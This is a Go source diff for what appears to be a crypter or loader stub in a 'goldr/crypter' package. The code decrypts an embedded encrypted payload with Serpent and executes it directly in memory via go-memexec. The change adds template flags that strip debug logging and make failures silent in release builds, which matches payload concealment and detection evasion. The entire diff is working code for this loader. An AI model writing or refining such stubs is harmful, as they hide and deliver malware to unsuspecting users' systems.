@@ -2,12 +2,16 @@ package main
 
 import (
 	_ "embed"
-	"fmt"
-	"goldr/crypter"
+	//{{if .Debug}}
 	"log"
-	"time"
+	//{{end}}
+	"goldr/crypter"
+
+	//{{if .Memexec}}
+	"os/exec"
 
 	"github.com/amenzhinsky/go-memexec"
+	//{{end}}
 )
 
 var (
@@ -18,25 +22,32 @@ var (
 )
 
 func main() {
+	//{{if .Memexec}}
 	bin, err := crypter.SerpentDecrypt(cryptbin, key)
 	if err != nil {
-		fmt.Println(err.Error())
-		log.Fatal(err.Error())
+		//{{if .Debug}}
+		log.Printf("Failed to decrpyt payload: %s\n", err.Error())
+		//{{end}}
+		return
 	}
 	exe, err := memexec.New(bin)
 	if err != nil {
-		fmt.Println(err.Error())
-		log.Fatal(err.Error())
+		//{{if .Debug}}
+		log.Printf("Failed to create memexec obj: %s\n", err.Error())
+		//{{end}}
+		return
 	}
 	defer exe.Close()
-
 	cmd := exe.Command()
-	out, err := cmd.CombinedOutput()
+	err = cmd.Run()
 	if err != nil {
-		log.Fatalf("Error in CombinedOutput: %s", err.Error())
+		//{{if .Debug}}
+		if exiterr, ok := err.(*exec.ExitError); ok {
+			log.Printf("Execution failed with ExitCode: %d\n", exiterr.ExitCode())
+		}
+		//{{end}}
+		return
 	}
-	log.Printf("Output: %s", out)
-	for {
-		time.Sleep(5000)
-	}
+
+	//{{end}}
 }
